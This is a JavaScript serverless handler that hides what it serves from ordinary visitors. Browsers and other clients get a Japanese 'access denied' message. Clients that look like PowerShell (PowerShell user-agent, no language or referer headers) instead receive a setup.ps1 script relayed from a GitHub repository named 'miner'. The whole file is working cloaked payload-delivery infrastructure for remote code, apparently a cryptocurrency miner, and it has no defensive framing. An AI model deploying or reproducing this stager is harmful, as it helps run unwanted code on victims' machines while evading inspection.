export default async function handler(req, res) {
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  const acceptLang = req.headers['accept-language'];
  const referer = req.headers['referer'];

  const isPowerShell =
    ua.includes('powershell') &&
    !acceptLang &&
    !referer;

  if (!isPowerShell) {
    return res.send('アクセスが拒否されました。');
  }

  const rawUrl =
    'https://raw.githubusercontent.com/5q0r/miner/refs/heads/main/setup.ps1';

  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 5000);

    const response = await fetch(rawUrl, { signal: controller.signal });
    clearTimeout(timeout);

    if (!response.ok) {
      res.status(502).setHeader('Content-Type', 'text/plain');
      return res.send(`Failed to fetch remote file: HTTP ${response.status}`);
    }

    const content = await response.text();

    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    return res.status(200).send(content);
  } catch (error) {
    console.error(error);

    const msg =
      error.name === 'AbortError'
        ? 'Error: Upstream request timed out'
        : 'Error: Internal Server Error';

    res.status(500).setHeader('Content-Type', 'text/plain');
    return res.send(msg);
  }
}